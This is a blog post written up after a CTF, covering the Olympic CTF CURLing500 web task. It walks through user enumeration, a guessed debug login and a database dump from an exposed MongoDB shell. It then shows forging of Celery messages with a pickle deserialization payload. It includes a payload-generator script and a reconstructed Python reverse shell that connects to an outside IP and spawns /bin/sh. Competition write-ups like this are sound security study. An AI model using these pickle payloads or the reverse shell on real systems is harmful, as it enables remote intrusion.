+++
author = "pwntester"
categories = ["CTF", "Web", "Olympic"]
date = 2014-02-14T16:29:00Z
description = ""
draft = false
slug = "olympic-ctf-curling500-write-up"
tags = ["CTF", "Web", "Olympic"]
title = "Olympic CTF CURLing500 Write Up"

+++


We didnt have time to finish this task during the game since we decided to finish Freestyle 400 (scored in the last minute) but as I foound out later, we were close to finish it.

In this level we were presented with a login form vulnerable to user enumeration. It was easy to see that **admin** was a valid user but we could not guess the password. After trying with other "normal" accounts like guest, dev and so on, we found that **debug** was a valid account and the password was **debug**. Nice, we were in.

Then we were presented with a console to enter and run our code. Simple evaluations like "1+1" and "'some'.concat('thing')" worked. What gave us more details was entering "help":

```lang-javascript line-numbers 
function (x) { if (x == "mr") { print("\nSee also http://dochub.mongodb.org/core/mapreduce"); print("\nfunction mapf() {"); print(" // 'this' holds current document to inspect"); print(" emit(key, value);"); print("}"); print("\nfunction reducef(key,value_array) {"); print(" return reduced_value;"); print("}"); print("\ndb.mycollection.mapReduce(mapf, reducef[, options])"); print("\noptions"); print("{[query : <query filter object>]"); print(" [, sort : <sort the query. useful for optimization>]"); print(" [, limit : <number of objects to return from collection>]"); print(" [, out : <output-collection name>]"); print(" [, keeptemp: <true|false>]"); print(" [, finalize : <finalizefunction>]"); print(" [, scope : <object where fields go into javascript global scope >]"); print(" [, verbose : true]}\n"); return; } else if (x == "connect") { print("\nNormally one specifies the server on the mongo shell command line. Run mongo --help to see those options."); print("Additional connections may be opened:\n"); print(" var x = new Mongo('host[:port]');"); print(" var mydb = x.getDB('mydb');"); print(" or"); print(" var mydb = connect('host[:port]/mydb');"); print("\nNote: the REPL prompt only auto-reports getLastError() for the shell command line connection.\n"); return; } else if (x == "keys") { print("Tab completion and command history is available at the command prompt.\n"); print("Some emacs keystrokes are available too:"); print(" Ctrl-A start of line"); print(" Ctrl-E end of line"); print(" Ctrl-K del to end of line"); print("\nMulti-line commands"); print("You can enter a multi line javascript expression. If parens, braces, etc. are not closed, you will see a new line "); print("beginning with '...' characters. Type the rest of your expression. Press Ctrl-C to abort the data entry if you"); print("get stuck.\n"); } else if (x == "misc") { print("\tb = new BinData(subtype,base64str) create a BSON BinData value"); print("\tb.subtype() the BinData subtype (0..255)"); print("\tb.length() length of the BinData data in bytes"); print("\tb.hex() the data as a hex encoded string"); print("\tb.base64() the data as a base 64 encoded string"); print("\tb.toString()"); print(); print("\tb = HexData(subtype,hexstr) create a BSON BinData value from a hex string"); print("\tb = UUID(hexstr) create a BSON BinData value of UUID subtype"); print("\tb = MD5(hexstr) create a BSON BinData value of MD5 subtype"); print("\t\"hexstr\" string, sequence of hex characters (no 0x prefix)"); print(); print("\to = new ObjectId() create a new ObjectId"); print("\to.getTimestamp() return timestamp derived from first 32 bits of the OID"); print("\to.isObjectId"); print("\to.toString()"); print("\to.equals(otherid)"); print(); print("\td = ISODate() like Date() but behaves more intuitively when used"); print("\td = ISODate('YYYY-MM-DD hh:mm:ss') without an explicit \"new \" prefix on construction"); return; } else if (x == "admin") { print("\tls([path]) list files"); print("\tpwd() returns current directory"); print("\tlistFiles([path]) returns file list"); print("\thostname() returns name of this host"); print("\tcat(fname) returns contents of text file as a string"); print("\tremoveFile(f) delete a file or directory"); print("\tload(jsfilename) load and execute a .js file"); print("\trun(program[, args...]) spawn a program and wait for its completion"); print("\trunProgram(program[, args...]) same as run(), above"); print("\tsleep(m) sleep m milliseconds"); print("\tgetMemInfo() diagnostic"); return; } else if (x == "test") { print("\tstartMongodEmpty(args) DELETES DATA DIR and then starts mongod"); print("\t returns a connection to the new server"); print("\tstartMongodTest(port,dir,options)"); print("\t DELETES DATA DIR"); print("\t automatically picks port #s starting at 27000 and increasing"); print("\t or you can specify the port as the first arg"); print("\t dir is /data/db/<port>/ if not specified as the 2nd arg"); print("\t returns a connection to the new server"); print("\tresetDbpath(dirpathstr) deletes everything under the dir specified including subdirs"); print("\tstopMongoProgram(port[, signal])"); return; } else if (x == "") { print("\t" + "db.help() help on db methods"); print("\t" + "db.mycoll.help() help on collection methods"); print("\t" + "sh.help() sharding helpers"); print("\t" + "rs.help() replica set helpers"); print("\t" + "help admin administrative help"); print("\t" + "help connect connecting to a db help"); print("\t" + "help keys key shortcuts"); print("\t" + "help misc misc things to know"); print("\t" + "help mr mapreduce"); print(); print("\t" + "show dbs show database names"); print("\t" + "show collections show collections in current database"); print("\t" + "show users show users in current database"); print("\t" + "show profile show most recent system.profile entries with time >= 1ms"); print("\t" + "show logs show the accessible logger names"); print("\t" + "show log [name] prints out the last segment of log in memory, 'global' is default"); print("\t" + "use <db_name> set current database"); print("\t" + "db.foo.find() list objects in collection foo"); print("\t" + "db.foo.find( { a : 1 } ) list objects in foo where a == 1"); print("\t" + "it result of the last line evaluated; use to further iterate"); print("\t" + "DBQuery.shellBatchSize = x set default number of items to display on shell"); print("\t" + "exit quit the mongo shell"); } else print("unknown help option"); }.
```

Nice, a bunch of useful information, specially the references to **MongoDB**. Since it seems that we were working we Mongo, we entered the following commands:

```lang-javascript line-numbers 
db.getMongo().getDBNames()
         [u'admin', u'web500', u'local', u'flag', u'flags'].
```

```lang-javascript line-numbers 
db.getCollectionNames()
         [u'lulz', u'system.indexes', u'system.users', u'users'].
```

```lang-javascript line-numbers 
db.users.findOne()
         {u'login': u'debug', u'_id': ObjectId('52f661f917c6f07b4987ec03'), u'pwd': u'debug'}.
```

```lang-javascript line-numbers 
db.users.find().toArray()
         [{u'login': u'debug', u'_id':  ObjectId('52f661f917c6f07b4987ec03'), u'pwd': u'debug'},
         {u'login':  u'admin', u'_id': ObjectId('52f6623c17c6f07b4987ec04'), u'pwd':  u'firststeptoflag-done'}].
```

Pretty cool, now we have the admin credentials and can log in as administrator.

When logged in as admin, we could see a form with two fields: a base64 encoded text and a signature to submit the base64 "command":

```lang-bash line-numbers 
eyJib2R5IjogImdBSjljUUVvVlFkbGVIQnBjbVZ6Y1FKT1ZRTjFkR054QTRoVkJHRnlaM054QkVzWFN5cUdjUVZWQldOb2IzSmtjUVpPVlFsallXeHNZbUZqYTNOeEIwNVZDR1Z5Y21KaFkydHpjUWhPVlFkMFlYTnJjMlYwY1FsT1ZRSnBaSEVLVlNSaE0yUTVZems0Tmkxak5EWXhMVFExWmpBdE9UTm1ZUzA1WWpCbE9USTVZVEppTXpkeEMxVUhjbVYwY21sbGMzRU1Td0JWQkhSaGMydHhEVlVOWVhCd0xuUmxjM1JmZEdGemEzRU9WUWwwYVcxbGJHbHRhWFJ4RDA1T2hsVURaWFJoY1JCT1ZRWnJkMkZ5WjNOeEVYMXhFblV1IiwgImhlYWRlcnMiOiB7fSwgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXB5dGhvbi1zZXJpYWxpemUiLCAicHJvcGVydGllcyI6IHsiYm9keV9lbmNvZGluZyI6ICJiYXNlNjQiLCAiY29ycmVsYXRpb25faWQiOiAiYTNkOWM5ODYtYzQ2MS00NWYwLTkzZmEtOWIwZTkyOWEyYjM3IiwgInJlcGx5X3RvIjogIjAxOTI1YTNmLTE3ZDUtM2YzYy1iMDg2LTZjNzFiZTBlMmI1MCIsICJkZWxpdmVyeV9pbmZvIjogeyJwcmlvcml0eSI6IDAsICJyb3V0aW5nX2tleSI6ICJjZWxlcnkiLCAiZXhjaGFuZ2UiOiAiY2VsZXJ5In0sICJkZWxpdmVyeV9tb2RlIjogMiwgImRlbGl2ZXJ5X3RhZyI6IDF9LCAiY29udGVudC1lbmNvZGluZyI6ICJiaW5hcnkifQ==
```

```lang-bash line-numbers 
9ce5b4b977d4cdd5941dfad4da1b2c9fc47a35e3a68f80e43f3ea2145c694405
```

If we decode the command we got:

```lang-bash line-numbers 
{"body": "gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsXSyqGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSRhM2Q5Yzk4Ni1jNDYxLTQ1ZjAtOTNmYS05YjBlOTI5YTJiMzdxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUNYXBwLnRlc3RfdGFza3EOVQl0aW1lbGltaXRxD05OhlUDZXRhcRBOVQZrd2FyZ3NxEX1xEnUu", "headers": {}, "content-type": "application/x-python-serialize", "properties": {"body_encoding": "base64", "correlation_id": "a3d9c986-c461-45f0-93fa-9b0e929a2b37", "reply_to": "01925a3f-17d5-3f3c-b086-6c71be0e2b50", "delivery_info": {"priority": 0, "routing_key": "celery", "exchange": "celery"}, "delivery_mode": 2, "delivery_tag": 1}, "content-encoding": "binary"}
```

The content-type: x-python-serialize tell us that the body is some kind of serialized python code. If we decode it:

```lang-bash line-numbers 
}q(UexpiresqNUutcqUargsqKK*qUchordqNU    callbacksqNUerrbacksqNUtasksetq NUidq
U$a3d9c986-c461-45f0-93fa-9b0e929a2b37q
Uretriesq
K
```

There was also a binary called **signer-striped** available for download. So it seems we can serialize our payload with pickle, sign it using the signer and submit the payload and the signature.

The first problem is that the **signer** is a **arm64** binary:

```lang-bash line-numbers 
signer-striped: ELF 64-bit LSB executable, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.7.0, BuildID[sha1]=0xef4ad560b1f9a141560710535a904093212a8a22, stripped
```

We have to set up a chroot with qemu-arm64 to emulate the hardware and be able to run the signer. Now, lets go for the payload.

This is as far as we got during the game since we didnt have time and decided to go for the Freestyle400 one. I tried to solve it but the CTF VMs are down so the rest is just how I think the task was solved based on the [request](http://pastebin.com/ygn11B1p) posted by [@maciekkotowicz](https://twitter.com/maciekkotowicz) in the IRC channel. I decided to post this entry since there are no write-ups in the web and the last part was interesting.

The request posted in pastebin can be decoded to:

```lang-bash line-numbers 
{"body": "Y3R5cGVzCkZ1bmN0aW9uVHlwZQooY21hcnNoYWwKbG9hZHMKKGNiYXNlNjQKYjY0ZGVjb2RlCihTJ1l3QUFBQUFGQUFBQUF3QUFBRU1BQUFCem1BQUFBSFFBQUdRQkFJTUJBSDBBQUhRQUFHUUNBSU1CQUgwQkFIUUFBR1FEQUlNQkFIMENBSHdBQUdvQkFJTUFBSDBEQUh3REFHb0NBR1FMQUlNQkFBRjhBZ0JxQXdCOEF3QnFCQUNEQUFCa0JnQ0RBZ0FCZkFJQWFnTUFmQU1BYWdRQWd3QUFaQWNBZ3dJQUFYd0NBR29EQUh3REFHb0VBSU1BQUdRSUFJTUNBQUY4QVFCcUJRQmtDUUJrQ2dCbkFnQ0RBUUI5QkFCa0FBQlRLQXdBQUFCT2RBWUFBQUJ6YjJOclpYUjBDZ0FBQUhOMVluQnliMk5sYzNOMEFnQUFBRzl6Y3d3QUFBQTVOQzR5TXk0eU1URXVPREpwT0JBQUFHa0FBQUFBYVFFQUFBQnBBZ0FBQUhNSEFBQUFMMkpwYmk5emFITUNBQUFBTFdrb0FnQUFBSE1NQUFBQU9UUXVNak11TWpFeExqZ3lhVGdRQUFBb0JnQUFBSFFLQUFBQVgxOXBiWEJ2Y25SZlgxSUFBQUFBZEFjQUFBQmpiMjV1WldOMGRBUUFBQUJrZFhBeWRBWUFBQUJtYVd4bGJtOTBCQUFBQUdOaGJHd29CUUFBQUhRQ0FBQUFjM04wQWdBQUFITndVZ0lBQUFCMEFRQUFBSE4wQVFBQUFIQW9BQUFBQUNnQUFBQUFjd2tBQUFBdmRHMXdMM2N1Y0hsMEF3QUFBSEIzYmdRQUFBQnpFZ0FBQUFBQkRBRU1BUXdCREFBTkFSWUFGZ0FXQVE9PScKdFJ0UmNfX2J1aWx0aW5fXwpnbG9iYWxzCih0UlMnJwp0Uih0Ui4=", "headers": {}, "content-type": "application/x-python-serialize", "properties": {"body_encoding": "base64", "correlation_id": "a3d9c986-c461-45f0-93fa-9b0e929a2b37", "reply_to": "01925a3f-17d5-3f3c-b086-6c71be0e2b50", "delivery_info": {"priority": 10, "routing_key": "celery", "exchange": "celery"}, "delivery_mode": 2, "delivery_tag": 1}, "content-encoding": "binary"}
```

We can see that the server accepted the same correlation_id, reply_to and delivery_info. If we decode the body:

```lang-bash line-numbers 
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAAFAAAAAwAAAEMAAABzmAAAAHQAAGQBAIMBAH0AAHQAAGQCAIMBAH0BAHQAAGQDAIMBAH0CAHwAAGoBAIMAAH0DAHwDAGoCAGQLAIMBAAF8AgBqAwB8AwBqBACDAABkBgCDAgABfAIAagMAfAMAagQAgwAAZAcAgwIAAXwCAGoDAHwDAGoEAIMAAGQIAIMCAAF8AQBqBQBkCQBkCgBnAgCDAQB9BABkAABTKAwAAABOdAYAAABzb2NrZXR0CgAAAHN1YnByb2Nlc3N0AgAAAG9zcwwAAAA5NC4yMy4yMTEuODJpOBAAAGkAAAAAaQEAAABpAgAAAHMHAAAAL2Jpbi9zaHMCAAAALWkoAgAAAHMMAAAAOTQuMjMuMjExLjgyaTgQAAAoBgAAAHQKAAAAX19pbXBvcnRfX1IAAAAAdAcAAABjb25uZWN0dAQAAABkdXAydAYAAABmaWxlbm90BAAAAGNhbGwoBQAAAHQCAAAAc3N0AgAAAHNwUgIAAAB0AQAAAHN0AQAAAHAoAAAAACgAAAAAcwkAAAAvdG1wL3cucHl0AwAAAHB3bgQAAABzEgAAAAABDAEMAQwBDAANARYAFgAWAQ=='
tRtRc__builtin__
globals
(tRS''
tR(tR.
```

This is easily recognozible as pickle serialized data and actually is a know template to execute code via pickle deserialization. You can find a nice post describing how does it work [here](www.cs.jhu.edu/~s/musings/pickle.html), but basically what will be execute is the python code object (got via function.func_code) encoded with base64.

In order to generate the payload we can use the following python script:

```lang-python line-numbers 
import marshal
import base64

def foo():
    pass # PAYLOAD HERE

print """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))
```

We can reverse the process to figure out what was the payload used:

```lang-python line-numbers 
import marshal
import base64

payload = "YwAAAAAFAAAAAwAAAEMAAABzmAAAAHQAAGQBAIMBAH0AAHQAAGQCAIMBAH0BAHQAAGQDAIMBAH0CAHwAAGoBAIMAAH0DAHwDAGoCAGQLAIMBAAF8AgBqAwB8AwBqBACDAABkBgCDAgABfAIAagMAfAMAagQAgwAAZAcAgwIAAXwCAGoDAHwDAGoEAIMAAGQIAIMCAAF8AQBqBQBkCQBkCgBnAgCDAQB9BABkAABTKAwAAABOdAYAAABzb2NrZXR0CgAAAHN1YnByb2Nlc3N0AgAAAG9zcwwAAAA5NC4yMy4yMTEuODJpOBAAAGkAAAAAaQEAAABpAgAAAHMHAAAAL2Jpbi9zaHMCAAAALWkoAgAAAHMMAAAAOTQuMjMuMjExLjgyaTgQAAAoBgAAAHQKAAAAX19pbXBvcnRfX1IAAAAAdAcAAABjb25uZWN0dAQAAABkdXAydAYAAABmaWxlbm90BAAAAGNhbGwoBQAAAHQCAAAAc3N0AgAAAHNwUgIAAAB0AQAAAHN0AQAAAHAoAAAAACgAAAAAcwkAAAAvdG1wL3cucHl0AwAAAHB3bgQAAABzEgAAAAABDAEMAQwBDAANARYAFgAWAQ=="
p1 = base64.b64decode(payload);
p2 = marshal.loads(p1);
print p2.co_consts
```

```lang-bash line-numbers 
(None, 'socket', 'subprocess', 'os', '94.23.211.82', 4152, 0, 1, 2, '/bin/sh', '-i', ('94.23.211.82', 4152))
```

This looks like a reverse shell, so we can guess the payload function was something like:

```lang-bash line-numbers 
def pwn():
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("94.23.211.821",4152))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
```

According to [@maciekkotowicz](https://twitter.com/maciekkotowicz/status/434804205912465409), once you got the shell you had to look for the flag in a RedisDB, but I didnt get the chance to try that.

